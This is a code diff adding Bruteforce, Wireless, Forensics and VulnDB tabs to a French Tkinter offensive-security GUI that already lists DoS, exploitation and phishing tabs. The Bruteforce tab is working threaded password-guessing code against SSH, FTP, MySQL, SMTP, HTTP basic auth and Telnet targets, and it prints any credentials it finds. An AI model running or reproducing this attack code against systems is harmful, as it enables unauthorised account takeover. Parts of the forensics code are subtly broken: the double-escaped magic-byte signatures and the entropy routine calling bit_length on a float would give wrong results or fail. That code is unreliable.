@@ -267,10 +267,14 @@ class CyberAI(tk.Tk):
             " OSINT ":     OSINTTab,
             " Mots de passe ":  PasswordTab,
             " Crypto ":    CryptoTab,
+            " Bruteforce ":  BruteforceTab,
             " DoS ":       DoSTab,
             " Anonymat " : AnonymityTab,
             " Exploitation "   : ExploitTab,
             " Hameçonnage "  : PhishingTab,
+            " Wireless ":  WirelessTab,
+            " Forensics ": ForensicsTab,
+            " VulnDB ":    VulnDBTab,
             " Reporting " : ReportingTab,
         }
 
@@ -3827,6 +3831,810 @@ pre{{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:16px;
 <div class="footer">Rapport généré par CyberAI v2.0</div>
 </body>
 </html>"""
+
+
+# ════════════════════════ 12. BRUTEFORCE ════════════════════════
+class BruteforceTab(BaseTab):
+    def __init__(self, parent, app):
+        super().__init__(parent, app)
+        self.stop_flag = threading.Event()
+        self.build()
+
+    def build(self):
+        main = ttk.Frame(self.parent)
+        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        f = ttk.LabelFrame(main, text="Bruteforce Multi-Protocole")
+        f.pack(fill=tk.X, pady=(0, 8))
+
+        ttk.Label(f, text="Cible:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.entry_target = ttk.Entry(f, width=22, font=("TkDefaultFont", 11))
+        self.entry_target.grid(row=0, column=1, padx=5, pady=4)
+
+        ttk.Label(f, text="Port:").grid(row=0, column=2, padx=5, pady=4, sticky="w")
+        self.entry_port = ttk.Spinbox(f, from_=1, to=65535, width=6)
+        self.entry_port.set(22)
+        self.entry_port.grid(row=0, column=3, padx=5, pady=4)
+
+        ttk.Label(f, text="Protocole:").grid(row=0, column=4, padx=5, pady=4, sticky="w")
+        self.bf_proto = tk.StringVar(value="ssh")
+        proto_frame = ttk.Frame(f)
+        proto_frame.grid(row=0, column=5, columnspan=3, padx=5, pady=4)
+        for p in ["ssh", "ftp", "mysql", "smtp", "http-basic", "telnet"]:
+            ttk.Radiobutton(proto_frame, text=p.upper(), variable=self.bf_proto, value=p).pack(side=tk.LEFT, padx=2)
+
+        ttk.Label(f, text="User:").grid(row=1, column=0, padx=5, pady=4, sticky="w")
+        self.bf_user = ttk.Entry(f, width=15)
+        self.bf_user.insert(0, "admin")
+        self.bf_user.grid(row=1, column=1, padx=5, pady=4, sticky="w")
+
+        ttk.Label(f, text="Wordlist:").grid(row=1, column=2, padx=5, pady=4, sticky="w")
+        self.bf_wordlist = ttk.Entry(f, width=30)
+        self.bf_wordlist.grid(row=1, column=3, columnspan=2, padx=5, pady=4, sticky="ew")
+        ttk.Button(f, text="Parcourir", command=self.browse_wordlist).grid(row=1, column=5, padx=5)
+
+        ttk.Label(f, text="Threads:").grid(row=1, column=6, padx=5, pady=4, sticky="w")
+        self.bf_threads = ttk.Spinbox(f, from_=1, to=50, width=4)
+        self.bf_threads.set(5)
+        self.bf_threads.grid(row=1, column=7, padx=5, pady=4)
+
+        btnf = ttk.Frame(f)
+        btnf.grid(row=2, column=0, columnspan=8, pady=6)
+        self.bf_btn = ttk.Button(btnf, text="Démarrer Bruteforce", command=self.run_bruteforce, width=22)
+        self.bf_btn.pack(side=tk.LEFT, padx=5)
+        self.bf_stop = ttk.Button(btnf, text="Arrêter", command=self.stop_bruteforce, state=tk.DISABLED, width=12)
+        self.bf_stop.pack(side=tk.LEFT, padx=5)
+        self.bf_progress = ttk.Label(btnf, text="", foreground="gray")
+        self.bf_progress.pack(side=tk.LEFT, padx=10)
+
+        self.output = self.make_output(main)
+
+    def browse_wordlist(self):
+        fpath = filedialog.askopenfilename(title="Choisir une wordlist",
+                                           filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
+        if fpath:
+            self.bf_wordlist.delete(0, tk.END)
+            self.bf_wordlist.insert(0, fpath)
+
+    def stop_bruteforce(self):
+        self.stop_flag.set()
+        self.bf_btn.config(state=tk.NORMAL)
+        self.bf_stop.config(state=tk.DISABLED)
+        self.bf_progress.config(text="Arrêté")
+
+    def run_bruteforce(self):
+        target = self.entry_target.get().strip()
+        if not target:
+            messagebox.showwarning("Attention", "Entrez une cible.")
+            return
+        wl = self.bf_wordlist.get().strip()
+        if not wl or not os.path.isfile(wl):
+            messagebox.showwarning("Attention", "Choisissez une wordlist valide.")
+            return
+        self.clear(self.output)
+        self.stop_flag.clear()
+        self.bf_btn.config(state=tk.DISABLED)
+        self.bf_stop.config(state=tk.NORMAL)
+        self.run_thread(lambda: self.do_bruteforce(target))
+
+    def do_bruteforce(self, target):
+        proto = self.bf_proto.get()
+        port = int(self.entry_port.get())
+        user = self.bf_user.get().strip()
+        wl = self.bf_wordlist.get().strip()
+        n_threads = int(self.bf_threads.get())
+
+        self.log(self.output, f"Bruteforce {proto.upper()} sur {target}:{port}", "bold")
+        self.log(self.output, f"User: {user} | Wordlist: {wl} | Threads: {n_threads}\n")
+
+        try:
+            with open(wl, "r", encoding="utf-8", errors="ignore") as f:
+                passwords = [line.strip() for line in f if line.strip()]
+        except Exception as e:
+            self.log(self.output, f"Erreur wordlist: {e}", "error")
+            self.bf_btn.config(state=tk.NORMAL)
+            self.bf_stop.config(state=tk.DISABLED)
+            return
+
+        self.log(self.output, f"Mots de passe à tester: {len(passwords)}")
+        found = threading.Event()
+        lock = threading.Lock()
+        tested = [0]
+
+        def try_pwd(pwd):
+            if found.is_set() or self.stop_flag.is_set():
+                return
+            try:
+                success = False
+                if proto == "ssh":
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    ssh.connect(target, port=port, username=user, password=pwd, timeout=3, look_for_keys=False, allow_agent=False)
+                    ssh.close()
+                    success = True
+                elif proto == "ftp":
+                    import ftplib
+                    ftp = ftplib.FTP()
+                    ftp.connect(target, port, timeout=5)
+                    ftp.login(user, pwd)
+                    ftp.quit()
+                    success = True
+                elif proto == "mysql":
+                    import pymysql
+                    conn = pymysql.connect(host=target, port=port, user=user, password=pwd, connect_timeout=3)
+                    conn.close()
+                    success = True
+                elif proto == "smtp":
+                    import smtplib
+                    server = smtplib.SMTP(target, port, timeout=5)
+                    server.ehlo()
+                    server.login(user, pwd)
+                    server.quit()
+                    success = True
+                elif proto == "http-basic":
+                    r = requests.get(f"http://{target}:{port}/", auth=(user, pwd), timeout=3, verify=False)
+                    if r.status_code in (200, 301, 302):
+                        success = True
+                elif proto == "telnet":
+                    tn = telnetlib.Telnet(target, port, timeout=3)
+                    tn.read_until(b"login:", timeout=2)
+                    tn.write(user.encode() + b"\n")
+                    tn.read_until(b"Password:", timeout=2)
+                    tn.write(pwd.encode() + b"\n")
+                    out = tn.read_until(b"#", timeout=2)
+                    tn.close()
+                    if b"#" in out or b"$" in out:
+                        success = True
+                if success:
+                    self.log(self.output, f"  \u2713 TROUVÉ: {user}:{pwd}", "success")
+                    found.set()
+            except:
+                pass
+            finally:
+                with lock:
+                    tested[0] += 1
+                    if tested[0] % 10 == 0:
+                        self.app.after(0, lambda: self.bf_progress.config(text=f"{tested[0]}/{len(passwords)}"))
+
+        pool = []
+        batch = passwords[:5000]
+        with ThreadPoolExecutor(max_workers=n_threads) as executor:
+            executor.map(try_pwd, batch)
+
+        self.bf_btn.config(state=tk.NORMAL)
+        self.bf_stop.config(state=tk.DISABLED)
+        if not found.is_set():
+            self.log(self.output, "\nMot de passe non trouvé dans la wordlist.", "warning")
+
+        self.bf_progress.config(text=f"Terminé ({tested[0]} testés)")
+
+
+# ════════════════════════ 13. WIRELESS ════════════════════════
+class WirelessTab(BaseTab):
+    def __init__(self, parent, app):
+        super().__init__(parent, app)
+        self.build()
+
+    def build(self):
+        main = ttk.Frame(self.parent)
+        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        f = ttk.LabelFrame(main, text="Outils WiFi")
+        f.pack(fill=tk.X, pady=(0, 8))
+
+        ttk.Label(f, text="Interface:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
+        self.entry_iface = ttk.Entry(f, width=15, font=("TkDefaultFont", 11))
+        self.entry_iface.grid(row=0, column=1, padx=5, pady=5)
+        self.entry_iface.insert(0, "wlan0")
+
+        btnf = ttk.Frame(f)
+        btnf.grid(row=0, column=2, columnspan=5, padx=5, pady=5)
+        ttk.Button(btnf, text="Scan WiFi", command=self.run_scan_wifi, width=14).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Infos Interface", command=self.run_iface_info, width=16).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Mode Monitor", command=self.run_monitor_mode, width=16).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Mode Managed", command=self.run_managed_mode, width=16).pack(side=tk.LEFT, padx=3)
+
+        self.output = self.make_output(main)
+
+    def run_scan_wifi(self):
+        self.clear(self.output)
+        iface = self.entry_iface.get().strip()
+        self.run_thread(lambda: self.do_scan_wifi(iface))
+
+    def do_scan_wifi(self, iface):
+        self.log(self.output, f"Scan WiFi sur {iface}...", "bold")
+        self.log(self.output, "Note: nécessite les droits root et iwlist/iwconfig.\n")
+        try:
+            result = subprocess.run(["sudo", "iwlist", iface, "scan"], capture_output=True, text=True, timeout=30)
+            output = result.stdout + result.stderr
+            if "Network is down" in output or "Interface doesn't support scanning" in output:
+                self.log(self.output, "L'interface ne supporte pas le scan ou est down.", "error")
+                self.log(self.output, "  Essayez: sudo ip link set " + iface + " up", "warning")
+                return
+            if not output.strip():
+                self.log(self.output, "Aucun résultat (essayez en root).", "warning")
+                return
+
+            cells = output.split("Cell ")
+            self.log(self.output, f"Réseaux trouvés: {len(cells)-1}\n", "bold")
+            for cell in cells[1:]:
+                ssid = ""
+                addr = ""
+                channel = ""
+                signal = ""
+                encryption = ""
+                for line in cell.split("\n"):
+                    l = line.strip()
+                    if "ESSID:" in l:
+                        ssid = l.split("ESSID:")[1].strip('"')
+                    elif "Address:" in l:
+                        addr = l.split("Address:")[1].strip()
+                    elif "Channel:" in l:
+                        channel = l.split("Channel:")[1].strip()
+                    elif "Signal level=" in l:
+                        signal = l.split("Signal level=")[1].split(" ")[0]
+                    elif "Encryption key:" in l:
+                        encryption = "Oui" if "on" in l else "Non"
+                tag = "success" if encryption == "Oui" else "warning"
+                self.log(self.output, f"  {ssid:25s} | {addr:20s} | CH {channel:3s} | {signal:5s} dBm | Crypté: {encryption}", tag)
+        except FileNotFoundError:
+            self.log(self.output, "iwlist non installé (sudo apt install wireless-tools)", "error")
+        except subprocess.TimeoutExpired:
+            self.log(self.output, "Scan timeout.", "error")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_iface_info(self):
+        self.clear(self.output)
+        iface = self.entry_iface.get().strip()
+        self.run_thread(lambda: self.do_iface_info(iface))
+
+    def do_iface_info(self, iface):
+        self.log(self.output, f"Informations sur {iface}:", "bold")
+        try:
+            r = subprocess.run(["iwconfig", iface], capture_output=True, text=True, timeout=5)
+            self.log(self.output, r.stdout + r.stderr)
+            r2 = subprocess.run(["ip", "addr", "show", iface], capture_output=True, text=True, timeout=5)
+            self.log(self.output, r2.stdout)
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_monitor_mode(self):
+        self.clear(self.output)
+        iface = self.entry_iface.get().strip()
+        self.run_thread(lambda: self.do_set_mode(iface, "monitor"))
+
+    def run_managed_mode(self):
+        self.clear(self.output)
+        iface = self.entry_iface.get().strip()
+        self.run_thread(lambda: self.do_set_mode(iface, "managed"))
+
+    def do_set_mode(self, iface, mode):
+        cmd = "monitor" if mode == "monitor" else "managed"
+        self.log(self.output, f"Passage de {iface} en mode {cmd}...", "bold")
+        try:
+            subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True, timeout=5)
+            subprocess.run(["sudo", "iwconfig", iface, "mode", cmd], capture_output=True, timeout=5)
+            subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True, timeout=5)
+            self.log(self.output, f"  \u2713 {iface} est maintenant en mode {cmd}", "success")
+        except Exception as e:
+            self.log(self.output, f"  Erreur (root requis?): {e}", "error")
+
+
+# ════════════════════════ 14. FORENSICS ════════════════════════
+class ForensicsTab(BaseTab):
+    def __init__(self, parent, app):
+        super().__init__(parent, app)
+        self.build()
+
+    def build(self):
+        main = ttk.Frame(self.parent)
+        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        nb = ttk.Notebook(main)
+        nb.pack(fill=tk.BOTH, expand=True)
+
+        # ── Tab 1: Analyse de fichier ──
+        ff = ttk.Frame(nb)
+        nb.add(ff, text="Analyse Fichier")
+        self._build_file_analysis(ff)
+
+        # ── Tab 2: Hex Viewer ──
+        hf = ttk.Frame(nb)
+        nb.add(hf, text="Hex Viewer")
+        self._build_hex_viewer(hf)
+
+        # ── Tab 3: Métadonnées ──
+        mf = ttk.Frame(nb)
+        nb.add(mf, text="Métadonnées")
+        self._build_metadata(mf)
+
+        # ── Tab 4: Strings ──
+        sf = ttk.Frame(nb)
+        nb.add(sf, text="Strings")
+        self._build_strings(sf)
+
+        self.output = self.make_output(main)
+
+    def _build_file_analysis(self, parent):
+        f = ttk.LabelFrame(parent, text="Analyse de Fichier Forensique")
+        f.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f, text="Fichier:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.fa_path = ttk.Entry(f, width=55)
+        self.fa_path.grid(row=0, column=1, padx=5, pady=4, sticky="ew")
+        ttk.Button(f, text="Parcourir", command=self.browse_file_analysis).grid(row=0, column=2, padx=5)
+        f.columnconfigure(1, weight=1)
+
+        btnf = ttk.Frame(f)
+        btnf.grid(row=1, column=0, columnspan=3, pady=6)
+        ttk.Button(btnf, text="Analyser", command=self.run_file_analysis, width=18).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Détecter Type", command=self.run_detect_type, width=18).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Entropie", command=self.run_entropy, width=14).pack(side=tk.LEFT, padx=3)
+
+    def _build_hex_viewer(self, parent):
+        f = ttk.LabelFrame(parent, text="Hex Viewer")
+        f.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)
+
+        ttk.Label(f, text="Fichier:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.hex_path = ttk.Entry(f, width=50)
+        self.hex_path.grid(row=0, column=1, padx=5, pady=4, sticky="ew")
+        ttk.Button(f, text="Parcourir", command=self.browse_hex_file).grid(row=0, column=2, padx=5)
+        ttk.Button(f, text="Voir Hex", command=self.run_hex_view, width=12).grid(row=0, column=3, padx=5)
+
+        self.hex_output = scrolledtext.ScrolledText(f, height=18, font=("Consolas", 8), state="normal")
+        self.hex_output.grid(row=1, column=0, columnspan=4, padx=5, pady=5, sticky="nsew")
+        f.rowconfigure(1, weight=1)
+        f.columnconfigure(1, weight=1)
+
+    def _build_metadata(self, parent):
+        f = ttk.LabelFrame(parent, text="Extraction de Métadonnées")
+        f.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f, text="Fichier:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.meta_path = ttk.Entry(f, width=50)
+        self.meta_path.grid(row=0, column=1, padx=5, pady=4, sticky="ew")
+        ttk.Button(f, text="Parcourir", command=self.browse_meta_file).grid(row=0, column=2, padx=5)
+        ttk.Button(f, text="Extraire", command=self.run_metadata, width=14).grid(row=0, column=3, padx=5)
+
+    def _build_strings(self, parent):
+        f = ttk.LabelFrame(parent, text="Extraction de Chaînes (Strings)")
+        f.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f, text="Fichier:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.str_path = ttk.Entry(f, width=50)
+        self.str_path.grid(row=0, column=1, padx=5, pady=4, sticky="ew")
+        ttk.Button(f, text="Parcourir", command=self.browse_strings_file).grid(row=0, column=2, padx=5)
+
+        ttk.Label(f, text="Longueur min:").grid(row=0, column=3, padx=5, pady=4, sticky="w")
+        self.str_min = ttk.Spinbox(f, from_=4, to=100, width=4)
+        self.str_min.set(6)
+        self.str_min.grid(row=0, column=4, padx=5, pady=4, sticky="w")
+        ttk.Button(f, text="Extraire Strings", command=self.run_strings, width=18).grid(row=0, column=5, padx=5)
+
+    def browse_file_analysis(self):
+        f = filedialog.askopenfilename()
+        if f:
+            self.fa_path.delete(0, tk.END)
+            self.fa_path.insert(0, f)
+
+    def browse_hex_file(self):
+        f = filedialog.askopenfilename()
+        if f:
+            self.hex_path.delete(0, tk.END)
+            self.hex_path.insert(0, f)
+
+    def browse_meta_file(self):
+        f = filedialog.askopenfilename()
+        if f:
+            self.meta_path.delete(0, tk.END)
+            self.meta_path.insert(0, f)
+
+    def browse_strings_file(self):
+        f = filedialog.askopenfilename()
+        if f:
+            self.str_path.delete(0, tk.END)
+            self.str_path.insert(0, f)
+
+    # ── File Analysis ──
+    def run_file_analysis(self):
+        self.clear(self.output)
+        fpath = self.fa_path.get().strip()
+        if not fpath or not os.path.isfile(fpath):
+            messagebox.showwarning("Attention", "Choisissez un fichier valide.")
+            return
+        self.run_thread(lambda: self.do_file_analysis(fpath))
+
+    def do_file_analysis(self, fpath):
+        self.log(self.output, f"Analyse forensique: {os.path.basename(fpath)}", "bold")
+        self.log(self.output, f"  Chemin: {fpath}")
+        self.log(self.output, f"  Taille: {os.path.getsize(fpath)} octets")
+        self.log(self.output, f"  Modifié: {time.ctime(os.path.getmtime(fpath))}")
+        self.log(self.output, f"  Créé: {time.ctime(os.path.getctime(fpath))}")
+        self.log(self.output, f"  Permissions: {oct(os.stat(fpath).st_mode)[-3:]}")
+        try:
+            import magic
+            ft = magic.from_file(fpath)
+            self.log(self.output, f"  Type (magic): {ft}", "success")
+        except ImportError:
+            pass
+        except Exception:
+            pass
+        try:
+            import magic
+            mime = magic.from_file(fpath, mime=True)
+            self.log(self.output, f"  MIME: {mime}")
+        except:
+            pass
+        ext = os.path.splitext(fpath)[1].lower()
+        self.log(self.output, f"  Extension: {ext or '(aucune)'}")
+
+    def run_detect_type(self):
+        self.clear(self.output)
+        fpath = self.fa_path.get().strip()
+        if not fpath or not os.path.isfile(fpath):
+            messagebox.showwarning("Attention", "Choisissez un fichier.")
+            return
+        self.run_thread(lambda: self.do_detect_type(fpath))
+
+    def do_detect_type(self, fpath):
+        self.log(self.output, "Détection par signatures (magic bytes):", "bold")
+        MAGIC_SIGS = {
+            b"\\x89PNG": "PNG Image", b"\\xff\\xd8\\xff": "JPEG Image", b"GIF8": "GIF Image",
+            b"\\x42\\x4d": "BMP Image", b"\\x49\\x49\\x2a\\x00": "TIFF (little-endian)",
+            b"\\x4d\\x4d\\x00\\x2a": "TIFF (big-endian)", b"\\x25PDF": "PDF Document",
+            b"PK\\x03\\x04": "ZIP Archive", b"PK\\x05\\x06": "ZIP Archive (empty)",
+            b"\\x1f\\x8b\\x08": "GZIP Archive", b"\\x42\\x5a\\x68": "BZ2 Archive",
+            b"\\x52\\x61\\x72\\x21\\x1a\\x07": "RAR Archive", b"\\x7z\\xbc\\xaf\\x27\\x1c": "7z Archive",
+            b"\\x25\\x21": "PostScript", b"\\x1f\\x9d": "TAR (compressé)",
+            b"\\x43\\x57\\x53": "Compound File", b"\\xd0\\xcf\\x11\\xe0\\xa1\\xb1\\x1a\\xe1": "OLE2 / MS Office",
+            b"\\x7fELF": "ELF (Linux executable)", b"\\x4d\\x5a": "PE (Windows executable)",
+            b"\\xca\\xfe\\xba\\xbe": "Mach-O (Mac)", b"\\xcf\\xfa\\xed\\xfe": "Mach-O (64-bit)",
+            b"\\xff\\xfb": "MPEG Audio", b"\\x49\\x44\\x33": "MP3 (ID3 tag)",
+            b"\\x00\\x00\\x00\\x1c\\x66\\x74\\x79\\x70": "MP4 Video",
+            b"\\x1a\\x45\\xdf\\xa3": "WebM / Matroska",
+            b"\\x00\\x01\\x00\\x00\\x00": "TrueType Font", b"\\x4f\\x54\\x54\\x4f": "OpenType Font",
+        }
+        try:
+            with open(fpath, "rb") as f:
+                header = f.read(16)
+            hex_str = header.hex()
+            self.log(self.output, f"  Hex (16 premiers octets): {' '.join(hex_str[i:i+2] for i in range(0, 32, 2))}")
+            detected = "Inconnu"
+            for sig, desc in MAGIC_SIGS.items():
+                sig_bytes = sig.replace("\\x", "").encode() if "\\x" in sig else sig.encode()
+                try:
+                    sig_bytes = bytes(int(sig.replace("\\x", ""), 16)) if "\\x" in sig else sig.encode()
+                except:
+                    pass
+            # Simple approach
+            if header[:4] == b"\\x89PNG"[:4]: detected = "PNG Image"
+            elif header[:2] == b"\\xff\\xd8": detected = "JPEG Image"
+            elif header[:3] == b"GIF": detected = "GIF Image"
+            elif header[:4] == b"\\x25PDF"[:4]: detected = "PDF Document"
+            elif header[:2] == b"PK": detected = "ZIP/Office Archive"
+            elif header[:3] == b"\\x1f\\x8b\\x08"[:3]: detected = "GZIP Archive"
+            elif header[:4] == b"\\x7fELF"[:4]: detected = "ELF Executable"
+            elif header[:2] == b"\\x4d\\x5a"[:2]: detected = "PE Executable (Windows)"
+            elif header[:8] == b"\\x89PNG\\r\\n\\x1a\\n"[:8]: detected = "PNG Image"
+            elif header[:4] == b"\\x00\\x00\\x00\\x1c"[:4]: detected = "MP4/QuickTime"
+            elif header[:3] == b"\\x1a\\x45\\xdf"[:3]: detected = "WebM/Matroska"
+            self.log(self.output, f"  Type détecté: {detected}", "success")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_entropy(self):
+        self.clear(self.output)
+        fpath = self.fa_path.get().strip()
+        if not fpath or not os.path.isfile(fpath):
+            messagebox.showwarning("Attention", "Choisissez un fichier.")
+            return
+        self.run_thread(lambda: self.do_entropy(fpath))
+
+    def do_entropy(self, fpath):
+        self.log(self.output, f"Analyse d'entropie: {os.path.basename(fpath)}", "bold")
+        try:
+            with open(fpath, "rb") as f:
+                data = f.read()
+            freq = [0] * 256
+            for b in data:
+                freq[b] += 1
+            entropy = 0
+            for f in freq:
+                if f > 0:
+                    p = f / len(data)
+                    entropy -= p * (p.bit_length() if p > 0 else 0)
+            self.log(self.output, f"  Taille: {len(data)} octets")
+            self.log(self.output, f"  Entropie de Shannon: {entropy:.4f} bits/octet", "bold")
+            if entropy > 7.5:
+                self.log(self.output, "  → Chiffré ou compressé (haute entropie)", "warning")
+            elif entropy > 6:
+                self.log(self.output, "  → Probablement compressé", "warning")
+            else:
+                self.log(self.output, "  → Données brutes/texte (basse entropie)", "success")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    # ── Hex Viewer ──
+    def run_hex_view(self):
+        fpath = self.hex_path.get().strip()
+        if not fpath or not os.path.isfile(fpath):
+            messagebox.showwarning("Attention", "Choisissez un fichier.")
+            return
+        self.clear(self.hex_output)
+        self.run_thread(lambda: self.do_hex_view(fpath))
+
+    def do_hex_view(self, fpath):
+        try:
+            with open(fpath, "rb") as f:
+                data = f.read(4096)
+            self.hex_output.insert(tk.END, f"Hex dump: {os.path.basename(fpath)} ({len(data)} octets affichés)\n\n")
+            for i in range(0, len(data), 16):
+                chunk = data[i:i+16]
+                hex_part = " ".join(f"{b:02x}" for b in chunk)
+                ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
+                self.hex_output.insert(tk.END, f"{i:08x}  {hex_part:<48}  |{ascii_part}|\n")
+        except Exception as e:
+            self.hex_output.insert(tk.END, f"Erreur: {e}\n")
+
+    # ── Metadata ──
+    def run_metadata(self):
+        self.clear(self.output)
+        fpath = self.meta_path.get().strip()
+        if not fpath or not os.path.isfile(fpath):
+            messagebox.showwarning("Attention", "Choisissez un fichier.")
+            return
+        self.run_thread(lambda: self.do_metadata(fpath))
+
+    def do_metadata(self, fpath):
+        self.log(self.output, f"Métadonnées: {os.path.basename(fpath)}", "bold")
+        try:
+            from PIL import Image
+            from PIL.ExifTags import TAGS
+            img = Image.open(fpath)
+            self.log(self.output, f"  Format: {img.format}")
+            self.log(self.output, f"  Dimensions: {img.size[0]}x{img.size[1]}")
+            self.log(self.output, f"  Mode: {img.mode}")
+            exif = img._getexif()
+            if exif:
+                self.log(self.output, "\n  EXIF:", "bold")
+                for tag_id, value in exif.items():
+                    tag = TAGS.get(tag_id, tag_id)
+                    if isinstance(value, bytes):
+                        try:
+                            value = value.decode("utf-8", errors="ignore")
+                        except:
+                            value = str(value)
+                    self.log(self.output, f"    {tag}: {value}")
+            else:
+                self.log(self.output, "  Aucune donnée EXIF.", "warning")
+        except ImportError:
+            self.log(self.output, "  PIL requis pour les métadonnées images.", "warning")
+        except Exception:
+            self.log(self.output, "  Pas une image ou format non supporté.", "warning")
+        try:
+            from PIL import Image
+            from PIL.ExifTags import TAGS, GPSTAGS
+            img = Image.open(fpath)
+            exif = img._getexif()
+            if exif:
+                gps_data = {}
+                for tag_id, value in exif.items():
+                    tag = TAGS.get(tag_id, tag_id)
+                    if tag == "GPSInfo":
+                        for k, v in value.items():
+                            gps_tag = GPSTAGS.get(k, k)
+                            gps_data[gps_tag] = v
+                if gps_data:
+                    self.log(self.output, "\n  GPS:", "bold")
+                    for k, v in gps_data.items():
+                        self.log(self.output, f"    {k}: {v}")
+        except:
+            pass
+
+    # ── Strings ──
+    def run_strings(self):
+        self.clear(self.output)
+        fpath = self.str_path.get().strip()
+        if not fpath or not os.path.isfile(fpath):
+            messagebox.showwarning("Attention", "Choisissez un fichier.")
+            return
+        min_len = int(self.str_min.get())
+        self.run_thread(lambda: self.do_strings(fpath, min_len))
+
+    def do_strings(self, fpath, min_len):
+        self.log(self.output, f"Strings (>={min_len} chars) dans {os.path.basename(fpath)}:", "bold")
+        try:
+            with open(fpath, "rb") as f:
+                data = f.read()
+            current = []
+            count = 0
+            for b in data:
+                if 32 <= b < 127:
+                    current.append(chr(b))
+                else:
+                    if len(current) >= min_len:
+                        s = "".join(current)
+                        self.log(self.output, f"  {s}")
+                        count += 1
+                    current = []
+            if len(current) >= min_len:
+                s = "".join(current)
+                self.log(self.output, f"  {s}")
+                count += 1
+            self.log(self.output, f"\nTotal: {count} chaînes extraites.", "bold")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+
+# ════════════════════════ 15. VULN DB ════════════════════════
+class VulnDBTab(BaseTab):
+    def __init__(self, parent, app):
+        super().__init__(parent, app)
+        self.build()
+
+    def build(self):
+        main = ttk.Frame(self.parent)
+        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        # ── CVE Lookup ──
+        cvef = ttk.LabelFrame(main, text="Recherche CVE")
+        cvef.pack(fill=tk.X, pady=(0, 6))
+
+        ttk.Label(cvef, text="CVE ID:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.entry_cve = ttk.Entry(cvef, width=25, font=("TkDefaultFont", 11))
+        self.entry_cve.grid(row=0, column=1, padx=5, pady=4, sticky="w")
+        self.entry_cve.insert(0, "CVE-2026-42945")
+        ttk.Button(cvef, text="Chercher CVE", command=self.run_cve_lookup, width=16).grid(row=0, column=2, padx=5)
+
+        # ── Search ──
+        sf = ttk.LabelFrame(main, text="Recherche par Logiciel/Version")
+        sf.pack(fill=tk.X, pady=(0, 6))
+
+        ttk.Label(sf, text="Logiciel:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.entry_sw = ttk.Entry(sf, width=25, font=("TkDefaultFont", 11))
+        self.entry_sw.grid(row=0, column=1, padx=5, pady=4, sticky="w")
+        self.entry_sw.insert(0, "nginx")
+
+        ttk.Label(sf, text="Version:").grid(row=0, column=2, padx=5, pady=4, sticky="w")
+        self.entry_ver = ttk.Entry(sf, width=15)
+        self.entry_ver.grid(row=0, column=3, padx=5, pady=4, sticky="w")
+        self.entry_ver.insert(0, "1.24.0")
+
+        btnf = ttk.Frame(sf)
+        btnf.grid(row=1, column=0, columnspan=6, pady=6)
+        ttk.Button(btnf, text="Chercher Vuln.", command=self.run_search_vuln, width=18).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="ExploitDB", command=self.run_search_exploitdb, width=18).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Top CVEs récents", command=self.run_top_cves, width=18).pack(side=tk.LEFT, padx=3)
+
+        # ── Quick Vuln Check ──
+        qf = ttk.LabelFrame(main, text="Vulnérabilités Connues (Quick Check)")
+        qf.pack(fill=tk.X, pady=(0, 6))
+        ttk.Label(qf, text="Exemples: Apache 2.4.49, OpenSSH 7.7, Samba 3.5.0, etc.", foreground="gray").pack(padx=10, pady=4)
+
+        self.output = self.make_output(main)
+
+    def run_cve_lookup(self):
+        self.clear(self.output)
+        cve_id = self.entry_cve.get().strip()
+        if not cve_id:
+            messagebox.showwarning("Attention", "Entrez un CVE ID.")
+            return
+        self.run_thread(lambda: self.do_cve_lookup(cve_id))
+
+    def do_cve_lookup(self, cve_id):
+        self.log(self.output, f"Recherche de {cve_id}...", "bold")
+        try:
+            r = requests.get(f"https://cve.circl.lu/api/cve/{cve_id}", timeout=10)
+            if r.status_code == 200:
+                data = r.json()
+                self.log(self.output, f"  ID: {data.get('id', 'N/A')}", "bold")
+                self.log(self.output, f"  Description: {data.get('summary', 'N/A')[:500]}")
+                cvss = data.get('cvss')
+                if cvss:
+                    self.log(self.output, f"  CVSS Score: {cvss}", "error" if float(cvss) >= 7 else "warning")
+                self.log(self.output, f"  Accès: {data.get('access', {}).get('vector', 'N/A')}")
+                capec = data.get('capec', [])
+                if capec:
+                    self.log(self.output, "  CAPEC:", "bold")
+                    for c in capec[:3]:
+                        self.log(self.output, f"    - {c.get('name', 'N/A')}")
+            else:
+                self.log(self.output, f"CVE non trouvée (HTTP {r.status_code}).", "warning")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}. Essayez avec une connexion internet.", "error")
